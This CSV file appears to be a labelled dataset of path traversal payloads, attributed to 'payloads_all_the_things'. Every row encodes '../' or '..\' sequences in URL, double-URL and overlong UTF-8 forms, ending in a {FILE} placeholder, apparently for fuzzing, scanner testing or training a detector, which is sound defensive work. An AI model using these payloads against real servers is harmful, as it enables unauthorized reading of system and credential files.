payload,label,source
%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},path_traversal,payloads_all_the_things
..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},path_traversal,payloads_all_the_things
..\{FILE},path_traversal,payloads_all_the_things
..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\..\..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\..\..\..\..\{FILE},path_traversal,payloads_all_the_things
..\..\..\..\..\..\..\..\{FILE},path_traversal,payloads_all_the_things
..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},path_traversal,payloads_all_the_things
%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},path_traversal,payloads_all_the_things
..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE},path_traversal,payloads_all_the_things
..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c1%9c{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},path_traversal,payloads_all_the_things
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},path_traversal,payloads_all_the_things
